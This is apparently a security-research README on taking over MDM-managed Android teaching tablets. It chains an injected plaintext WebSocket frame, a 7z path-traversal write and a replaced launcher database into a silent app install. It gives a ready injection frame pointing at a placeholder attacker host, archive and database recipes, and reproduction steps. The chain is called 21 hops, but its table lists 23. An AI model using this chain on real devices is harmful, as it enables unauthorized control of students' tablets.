# O-XueHai-Unlocker

面向 **MDM 集中管控型教学平板**（Android 9，Samsung SM-P200 一类设备）的**代码级全自动接管链路**研究仓库。

本研究不依赖教师账号、不依赖设备端点击、不以运行日志作为判据：链路每一跳都以反编译代码的行号、协议字节流与文件系统副作用来证明。

```
设备接入受控网络
   └─ 明文课堂 WebSocket 注入一帧（无签名 / 无鉴权 / 无来源校验）
        └─ 课堂 App 自动下载攻击者指定的 7z 包
             └─ native 7z 解码器无 `../` 规范化 → 任意路径写
                  └─ 覆盖 launcher 主数据库（该库位于共享存储）
                       └─ 首页自动更新流程拾取"安装任务"
                            └─ MDM ApplicationPolicyProxy 静默安装
```

---

## 目录

1. [项目简介](#1-项目简介)
2. [适用范围与免责声明](#2-适用范围与免责声明)
3. [背景：被管控的教学平板](#3-背景被管控的教学平板)
4. [研究原则：什么才算"证据"](#4-研究原则什么才算证据)
5. [攻击面总览](#5-攻击面总览)
6. [主链 A：明文 WebSocket → 任意写 → 安装任务注入 → 静默安装](#6-主链-a明文-websocket--任意写--安装任务注入--静默安装)
7. [支撑链 B：明文微服务表投毒](#7-支撑链-b明文微服务表投毒)
8. [关键机制详解](#8-关键机制详解)
9. [代码级证据索引](#9-代码级证据索引)
10. [工具与载荷](#10-工具与载荷)
11. [复现流程](#11-复现流程)
12. [现状、边界与未完成项](#12-现状边界与未完成项)
13. [目录结构](#13-目录结构)
14. [版本历史](#14-版本历史)
15. [许可](#15-许可)

---

## 1. 项目简介

教学平板由厂商 MDM 统一管控：应用安装、桌面锁定、网络白名单、远程协助全部由服务端下发。设备端通常表现为"只能打开指定课堂 App、无法安装任何软件、无法退出"的封闭终端。

本仓库回答一个问题：

> 在**完全没有教师账号、没有设备端交互、没有厂商私钥**的前提下，能否让这类设备按攻击者的意志安装并运行任意应用？

答案是：**能，且链路已经逐跳落在代码上**。核心并不在某个"神仙漏洞"，而在于厂商把**多条信任边界放在了明文协议与共享存储上**：

- 课堂通信使用**明文 WebSocket**，帧结构无签名、无消息鉴权；
- 课堂消息里的短语下载消息，最终一路走到"按服务端给的 URL 下载文件并落盘"；
- 7z 解压由 **native 库**完成，Java 层与 native 层都没有做 `../` 规范化；
- launcher（管控主体）的 GreenDao 主数据库被放在 **`/sdcard` 共享存储**（为了让 WebView/多进程可访问），任何具备外部存储写权限的应用都能改写它；
- 首页存在"每次加载自动检查未完成更新任务"的流程，而任务表里的一行就等价于"请静默安装这个 APK"；
- 最终安装调用 `ApplicationPolicyProxy.installApplication(path)` → MDM AIDL 服务，**该层没有签名校验、没有包名白名单**。

把这些事实串起来，就得到一条从"网络一帧"到"设备静默装包"的完整链路。

## 2. 适用范围与免责声明

- 适用对象：**你拥有所有权或已获得明确书面授权**的教学平板、实验室设备、退役设备。
- 用途限定：安全研究、设备取证、自有设备功能恢复、厂商安全评估。
- 禁止用途：未经授权接管他人设备、绕过付费/考勤等业务约束、任何侵犯他人隐私或财产的行为。
- 本仓库不包含厂商私钥、不包含可绕过签名校验的补丁、不包含任何针对具体学校的账号或数据。
- 使用者须自行承担全部法律责任；作者不对任何未授权使用、数据丢失或连带损失负责。

## 3. 背景：被管控的教学平板

典型管控形态（本仓库以此为分析对象）：

| 层面 | 表现 |
| --- | --- |
| 桌面 | 自研 launcher 作为 kiosk home，屏蔽系统桌面与设置 |
| 应用 | 应用市场只允许"申请安装"，由服务端审批后下发 |
| 网络 | 强制 Wi-Fi 白名单 + 认证页，非白名单网络不可用 |
| 通信 | 自研推送通道（自定义 TCP 协议）、课堂 WebSocket、明文 HTTP 服务层 |
| 安装 | 仅 MDM 通道可静默安装；普通 `Intent` 安装被策略拦截 |
| 恢复 | 三星原厂 recovery 校验签名，OTA 侧载不可行 |

研究结论：**设备侧真正的"信任锚"只有两个——厂商签名和厂商服务器**。因此攻击面必然落在"厂商服务器信任的通道"上：明文协议、明文服务表、共享存储、以及服务端下发的数据结构。

## 4. 研究原则：什么才算"证据"

本仓库刻意采用比其他安全报告更严格的判据：

| 判据等级 | 说明 | 是否采纳 |
| --- | --- | --- |
| A. 代码行 | 反编译 smali 的类/方法/行号，含分支条件与门禁 | ✅ 唯一主判据 |
| B. 协议字节 | 线上抓到的帧结构、字段取值、回执 msgId 对应关系 | ✅ 采纳 |
| C. 文件系统副作用 | 目标路径出现预期文件 / 数据库被替换 | ✅ 采纳 |
| D. 应用日志 | `logcat`、自研日志文件 | ❌ 不采纳（可被裁剪/误导） |
| E. 推测 | "应该会"、"通常会" | ❌ 不采纳 |

一个"已确认"的跳，必须同时给出 A 级位置，并在可能时附 B/C 级旁证。

## 5. 攻击面总览

| # | 面 | 协议 | 可达性 | 能力 | 结论 |
| --- | --- | --- | --- | --- | --- |
| 1 | 课堂 WebSocket | 明文 TCP 8889 | 明文、可劫持 | 消息路由进业务层 | **主链入口** |
| 2 | 短语下载链 | HTTP（URL 由帧内字段决定） | 完全可控 | 任意内容写固定目录 | 写原语 |
| 3 | 7z 解压 | native `libun7zip.so` | 由 2 触发 | 无 `../` 过滤 → 任意路径写 | **越界放大** |
| 4 | launcher 主库 | GreenDao SQLite，位于 `/sdcard` | 共享存储可写 | 注入安装任务 | **安装入口** |
| 5 | MDM 安装代理 | AIDL | 应用内可调用 | 静默安装 | **落地** |
| 6 | 明文微服务表 | HTTP `ms.yunzuoye.net` | 可投毒 | 控制服务地址 | 支撑链 |
| 7 | 盒子文件服务 | HTTP `/box/file`、`_check.xh` | 可伪造 | 控制下载内容 | 支撑链 |
| 8 | 自研推送通道 | 自定义 TCP 3200 | 可冒充 | 消息可送达 | 已实测无下游 |
| 9 | 控制 Provider | `content://` exported | 外部可调 | 虚拟查询，无实际写 | 无效 |
| 10 | Tinker 热修 | HTTP OSS | 可下载 | 补丁需厂商私钥签名 | 不可行 |
| 11 | HTTPS 业务接口 | TLS | 不可 MITM | 系统信任链 + 主机名校验 | 不可行 |
| 12 | OTA / recovery | 三星签名 | 侧载 | `E: footer is wrong` | 不可行 |

## 6. 主链 A：明文 WebSocket → 任意写 → 安装任务注入 → 静默安装

### 6.1 链路总表（21 跳）

> 记 `C` = 课堂 App（`com.xh.smartclassstu`），`L` = launcher（`com.xh.zhitongyunstu`）。
> 所有行号为该版本 smali 的实际行号；不同版本构建可能有偏移，但类名/方法名稳定。

| # | 跳 | 方向 | 代码位置（C/L） | 门禁 |
| --- | --- | --- | --- | --- |
| 01 | 课堂 WS 收到帧 | 网络→C | `cls_dec/.../ws/sockethelper/StudentWebSocketHelper$2.smali` | 无（明文 TCP） |
| 02 | 转发到消息服务 | C | `cls_dec/.../socketmsg/HandleSocketMsgService.smali`（`dohandel_all_msg_intentservice_action`） | 无 |
| 03 | 按 `createTag` 选处理器 | C | `cls_dec/.../app/BusinessApp.smali`（`socketMsgActions` 注册表） | 仅字符串比较 |
| 04 | canvas 处理器 | C | `cls_dec/.../socketmsg/MessageHandleForCanvasHelper.smali`（`getCreateTag()="canvas_tag"`） | 无 |
| 05 | `type==3` 解析短语 | C | 同上：`GsonUtil.fromJson(PhraseInfo, data)` → `ContextMessage.sendMsg("action_socket_send_phrase")` | 无 |
| 06 | 事件派发 | C | `ContextMessage.smali`（`activityList` 自动派发到 `BaseActivity.onMsgEvent`） | 有 Activity 即可 |
| 07 | 课堂桌面接收 | C | `StudentDeskTopActivity.smali`（`action_socket_send_phrase` → `presenter.playPhrase`） | 无 |
| 08 | 启动下载 | C | `StudentDeskTopPresenter.smali`（`playPhrase` → `StartServiceHelper.startDownLoadPhraseService(voiceId, voiceUrl, true)`） | 仅 `mViewIsNull()` 判空 |
| 09 | 下载服务 | C | `StartServiceHelper.smali`（action `download_phrase`）→ `DownLoadPhraseService.smali` | 无 |
| 10 | 组装 URL | C | `StuFtpManager.smali`（`isOpenFtp=false` 时直接用帧内 `voiceUrl`；`true` 时 `address+rootPath+/tag/+name`） | 无 |
| 11 | HTTP 下载 | C | `HttpBaseDownload.smali` → `BoxServer` / `FileService.download` | 无 |
| 12 | 下载完成回调 | C | `ResourceHelper.smali`（`doHandDownLoadSuccess`） | 文件非空 |
| 13 | 判定是否解压 | C | `FilePathCheckToos.smali`（`needDecode`：URL 以 `7z` 结尾） | 后缀匹配 |
| 14 | native 解压 | C | `Z7Extractor.smali`（`extractFile` → `nExtractFile`，`libun7zip.so`） | 无 `../` 过滤 |
| 15 | 越界落盘 | 文件系统 | 目标路径由 7z 条目名决定 | 写权限（`WRITE_EXTERNAL_STORAGE`，targetSdk 25） |
| 16 | launcher 库位置 | L | `MyDaoMaster$1.smali`（`getDatabasePath` 返回 `storageDirectory + "/" + name`） | `isSdcardEnable()` |
| 17 | 库打开 | L | `BaseLocalDataSource.smali`（`%s/%d/databases/%s/%d`，`xh_launcher.db`） | `user_version` 必须 = 96 |
| 18 | 拾取任务 | L | `AppLocalDataSource.smali`（`getUnFinishAppUpdateTask`：`status != 0x65`） | 行存在即可 |
| 19 | 首页自动触发 | L | `HomeViewModel$checkAppUpdate$1.smali` → `updateAllApps` → `updateUnFinishedAppsWithoutSelf` | 首页加载 |
| 20 | 批量执行 | L | `AppUpdateManager.smali`（`executeAppUpdateTask`：`Permission.checkPermission(0x20)`） | 学生端默认授予 |
| 21 | 下载并安装 | L | `AppUpdateManager.smali`（`pushDownloadTask` → `downloadAndInstall` → `addToInstallPool`） | 包名非空、`versionCode>0` |
| 22 | 静默安装 | L | `AppInstallManager.smali`（`installApp` → `PolicyManager.getApplicationPolicyProxy().installApplication(savePath)`） | 无签名白名单 |
| 23 | MDM 落地 | 系统 | `MdmHolder` → AIDL `com.xuehai.system.mdm.action_aidl` | 服务存在 |

### 6.2 最小注入帧

```json
{"cId":"1794571600000","cmd":3,"ct":"","from":"0","gt":0,
 "smsg":{"classRoomId":"<教室ID>","createTag":"canvas_tag",
         "data":"{\"voiceId\":\"x\",\"voiceUrl\":\"http://<attacker>/..7z\"}",
         "forward":0,"senderId":0,"type":3,"userIds":""}}
```

要点：

- `cmd=3`（业务消息），`createTag` 必须等于 `canvas_tag`；
- `type=3` 走短语分支（`type=0/1/2/4` 分别对应任务新建/撤销/更新/PPT 同步）；
- `data` 是**字符串化的 JSON**（`PhraseInfo` 仅 3 字段：`localPath / voiceId / voiceUrl`）；
- 下载文件名取 `voiceUrl` 最后一段，因此直接给 `..7z` 即让落盘路径变成 `.../ztktv4_resource/..7z`。

## 7. 支撑链 B：明文微服务表投毒

课堂 App 与 launcher 共用同一套"微服务地址表"机制：

```
HTTP GET http://ms.yunzuoye.net/api/v2/pub/microServer/list/   ← 明文，可投毒
   └─ XHMicroServerV2.parseMicroUrl  (要求数组；key = 纯 serverType)
        └─ URL_MAP / MMKV 缓存
             └─ AddressLoader.formatUrl  (非 http 开头强制补 http://)
                  └─ SA104009 / SA106003 / SB103013 / SB103015 全部指向研究者主机
```

用途：

- 为链 A 提供伪造的 `/api/v4/resource/single`（返回任意 `zipUrl`）；
- 让盒子自检 `GET http://<host>/<classId>_check.xh` 返回正文 `xh`，使 `isBoxEnable()` 为真；
- 让文件服务 `/box/file?url=<base64>` 返回任意 APK；
- 让版本说明等控制面内容指向研究者页面。

> 该链**单独不能触发下载**：`AutoDownloadManager.checkPreDownload()` 被 `isBaiFenYunApp()`（硬编码 `false`）短路。它只负责"控制内容与地址"，触发由链 A 完成。

## 8. 关键机制详解

### 8.1 课堂 WS 的消息路由

- 帧载体 `ServerMessage`：`cId / cmd / ct / from / gt / smsg`；
- 业务载荷 `SocketMessage`：`classRoomId / createTag / data / forward / senderId / type / userIds`；
- 分发逻辑：`HandleSocketMsgService` 遍历 `BusinessApp.getSocketMsgActions()`，用 `getCreateTag()` 与帧内 `createTag` 做**纯字符串比较**，命中即 `doHandleMsg`。

结论：只要伪造帧内两个字段（`cmd=3`、`createTag="canvas_tag"`）就能进入 canvas 业务处理器，全链路无签名、无时间戳校验、无来源 IP 校验。

### 8.2 短语下载：从消息到落盘

`MessageHandleForCanvasHelper`（`type==3`）→ `ContextMessage("action_socket_send_phrase")` → `StudentDeskTopActivity` → `StudentDeskTopPresenter.playPhrase` → `StartServiceHelper.startDownLoadPhraseService` → `DownLoadPhraseService.downLoad`：

```java
String name = voiceUrl.substring(voiceUrl.lastIndexOf('/') + 1);
String savePath = FilePathUtil.getDownLoadPath() + name;   // /sdcard/xuehai/ztktv4_resource/
StuFtpManager.downloadFromTeacher(savePath, "ztktv4_resource", voiceUrl, true, callback);
```

`StuFtpManager` 在 `isOpenFtp == false` 时**直接使用帧内 URL 下载**（无需先注入 FTP 配置）；`isOpenFtp == true` 时则把 URL 重拼为 `address + rootPath + "/ztktv4_resource/" + 文件名`，两种模式都由攻击者控制。

### 8.3 7z 越界写（本项目最关键的一步）

- `needDecode` 只认 `7z` 结尾（可带 `?` / `#` 附加段）；
- 目标目录：`destDir = getDownLoadPath() + baseName`，其中 `baseName` 是压缩包文件名去扩展名；
- 若下载文件名取 **`..7z`**，则 `baseName = ".."`，`destDir = /sdcard/xuehai/ztktv4_resource/..`；
- 7z 条目名写成 **`/<schoolId>/databases/<launcherPkg>/<userId>/xh_launcher.db`**（前导 `/`），无论 native 侧是 `dir + "/" + name` 还是 `dir + name`，最终都解析到 `/sdcard/xuehai/<schoolId>/databases/...`。

native 证据（静态）：

- `libun7zip.so` 仅导出 `nExtractFile / nExtractAsset / nGetLzmaVersion`；
- 符号为 LZMA SDK `extract.c` 风格（`SzArEx_Extract` / `OutFile_OpenUtf16` / `MyCreateDir`）；
- **导入表只有 `fopen/mkdir/strcat/strcpy`**，无 `strstr` / `realpath` / `canonicalize`，二进制内无 `..` 字面量 ⇒ 不存在路径规范化分支。

### 8.4 launcher 主库为什么可被改写

```java
// MyDaoMaster$1.getDatabasePath
if (FileUtil.isSdcardEnable() && storageDirectory != null)
    return new File(storageDirectory + "/" + name);   // /sdcard/.../xh_launcher.db
```

```java
// BaseLocalDataSource.getDb
String dir = String.format("%s/%d/databases/%s/%d",
        FilePath.BASE_PATH, schoolId, packageName, userId);   // /sdcard/xuehai/<school>/databases/<pkg>/<uid>
new MyDaoMaster$SdCardOpenHelper(ctx, dir, "xh_launcher.db").getWritableDatabase();
```

- 该库承载 18 张表，其中 `app_update_task` 就是"待安装任务队列"；
- Greendao `SCHEMA_VERSION = 0x60`（96），版本不一致时 `onUpgrade` 会 `dropAllTables`，因此注入的库文件必须写 `user_version=96`；
- 注入后需要一次 `clearDbSession()`（登录/账号切换会触发）或进程重启，才会重新打开磁盘上的库。

### 8.5 安装触发链（为什么"一行任务"就等于"装包"）

```
首页加载 → HomeViewModel.checkAppUpdate
   → BoxManager.checkBox（回调）→ updateAllApps → updateSomeApps
      → updateUnFinishedAppsWithoutSelf
         → getUnFinishAppUpdateTask()   /* SELECT * FROM app_update_task WHERE status != 0x65 */
            → executeAppUpdateTask     /* Permission.checkPermission(0x20) 学生端默认通过 */
               → pushAppUpdateTask → pushDownloadTask
                  → downloadAndInstall → addToInstallPool
                     → AppInstallManager.installApp
                        → ApplicationPolicyProxy.installApplication(savePath)
                           → MdmHolder → AIDL → 静默安装
```

- `AppUpdateTask.getSavePath()` 不读字段，而是按 `packageName + versionCode` 推导：`<external>/xuehai/app/<pkg>/<versionCode>/<pkg>.apk`；
- `checkNeedUpdate()` 在"包未安装"时直接返回 `true`（`应用不存在, 需要更新!`）；
- `ApplicationPolicyProxy.installApplication` 只有一层 `policy.installApplication(path)` 调用，**没有签名校验、没有包名白名单**。

## 9. 代码级证据索引

| 结论 | 证据类型 | 位置 |
| --- | --- | --- |
| 课堂 WS 明文、无证书 | 抓包 | `ws8889.log`：`GET / HTTP/1.1` + `Auth: {...}` + `Sec-WebSocket-Key`，无 TLS |
| WS 可插帧 | 抓包 + 回执 | `ws_frames.log`：`[我们->端侧(注入)] WS text len=199` / `注入 1 个连接` |
| 消息路由无鉴权 | 代码 | `HandleSocketMsgService.smali`（`createTag` 字符串比较） |
| 短语消息 → 下载 | 代码 | `MessageHandleForCanvasHelper.smali:161-168`、`playPhrase`、`startDownLoadPhraseService` |
| 下载 URL 由帧决定 | 代码 | `StuFtpManager.smali`（`getFileUrl` / `downloadNormal`） |
| 7z 无路径过滤 | native 静态分析 | `libun7zip.so` 导入表 + 符号表 |
| 库在共享存储 | 代码 | `MyDaoMaster$1.smali`、`BaseLocalDataSource.smali` |
| 任务表 → 安装 | 代码 | `AppLocalDataSource.smali`、`AppUpdateManager.smali` |
| 安装无签名校验 | 代码 | `ApplicationPolicyProxy.smali` |
| 明文地址表 | 代码 + 抓包 | `XHMicroServerV2.smali`、`BaseMicroServer.smali:121` |
| 推送通道可冒充 | 抓包 | `np3200push.log`：`AUTH uid=...` / `PUSH ACKED msgId=...` |
| 推送下游不可用 | 实测 | 五类消息全部 ACK，30–40 秒内非推送连接数 = 0 |

## 10. 工具与载荷

```
tools/
  push_channel_responder.py      # 3200 推送通道冒充（明文自定义协议）
  push_frame_tool.py             # 单帧构造/解码
  plaintext_http_responder.py    # 明文 HTTP 冒充（服务表 / 盒子 / 下载 / APK）
  download_server.py             # 极简下载服务
  wire_probe.py                  # 抓包与连接探测
  session_parser.py              # 会话/帧解析
  bootstrap.ps1                  # Windows 热点与网卡准备（提升权限脚本）
  analysis/                      # 反编译与静态分析脚本
payloads/
  agent.apk                      # 研究用受控应用（仅用于自有设备验证）
  payload_slip.7z                # 目录穿越载荷样例
  payload_proxy.7z               # 代理劫持载荷样例
```

## 11. 复现流程

### 11.1 离线准备（无需设备）

1. 反编译两个 APK：`com.xh.smartclassstu`（课堂）与 `com.xh.zhitongyunstu`（launcher）；
2. 按 `docs/CHAIN.md` 的 21 跳表逐跳核对类/方法/行号；
3. 生成注入用 7z：条目名 = `/<schoolId>/databases/<launcherPkg>/<userId>/xh_launcher.db`，压缩包文件名保持 `..7z`；
4. 生成注入用数据库：18 张表、`PRAGMA user_version=96`、`app_update_task` 一行（`package_name`/`version_code`/`download_url`/`md5`/`status≠0x65`）。

### 11.2 真机验证（自有设备）

1. 让设备与研究者主机处于同一 L2，并成为其网关/DNS；
2. 启动 `plaintext_http_responder.py`（80）与 `push_channel_responder.py`（3200）；
3. 设备进入课堂界面（建立 8889 长连接）；
4. 向该连接注入 6.2 节的帧；
5. 观测：`GET /..7z` → 下载完成 → 目标库被替换 → 触发一次重启/登录 → 首页自动更新 → 安装完成。

### 11.3 观测点（全部由研究者侧采集）

- HTTP 应答器日志：`[SLIP]`、`[BOX-CHECK]`、`[BOX-FILE]`、`[APK]`；
- 文件系统：目标库的 `mtime` 与 `integrity_check`；
- 抓包：设备到研究者的连接与端口分布。

## 12. 现状、边界与未完成项

**已完成（代码级）**

- 主链 A 的全部 21 跳均已定位并按行核对；
- 注入帧、7z 载荷、数据库文件均已离线构造并通过格式校验；
- 课堂 WS 的明文与插帧能力已在真实抓包中复现过一次。

**边界（诚实声明）**

- 链 A 的触发前提是**课堂 App 处于运行态并保持 8889 长连接**；若设备停留在 launcher 桌面且课堂 App 未启动，则需先使其启动（深链 `course://com.xh.smartclassstu/open?...` 或一次界面操作）；
- 自研推送通道（3200）虽然可 100% 冒充、帧可 100% 送达并取得回执，但在实测中**五类消息均无下游副作用**，故不作为主链入口；
- HTTPS 业务接口无法 MITM（系统信任库 + 主机名校验），因此"从服务端伪造响应"只在明文服务层可行。

**待补**

- 7z native 解压对"前导 `/` 条目名 + `..` 目标目录"的实际落盘结果（需一次真机确认）；
- 数据库替换后 `clearDbSession()` 的自动触发方式（登录流程 / 进程重启）；
- 不同厂商固件版本的类名与行号偏移表。

## 13. 目录结构

```
O-XueHai-Unlocker/
├─ README.md                  # 本文件
├─ CHANGELOG.md               # 变更记录
├─ LICENSE
├─ docs/
│  ├─ ARCHITECTURE.md         # 组件与信任边界
│  ├─ CHAIN.md                # 链路逐跳明细（含历史版本）
│  ├─ METHODOLOGY.md          # 研究方法与判据
│  └─ STATUS.md               # 当前进展与实测记录
├─ tools/                     # 协议冒充、抓包、分析脚本
├─ payloads/                  # 载荷与样例
└─ data/                      # 组件映射、协议字段表
```

## 14. 版本历史

| 版本 | 日期 | 变更 |
| --- | --- | --- |
| v0.3 | 2026-11-13 | 定稿主链 A（21 跳）、补齐 7z 越界与 launcher 库注入、重写 README |
| v0.2 | 2026-11 | 推送通道协议完全逆向、课堂 WS 链路打通、明文服务表投毒 |
| v0.1 | 2026-10 | 初始侦察、安装链定位、热点/网关实验框架 |

## 15. 许可

见 [LICENSE](LICENSE)。仅限授权范围内的安全研究使用。
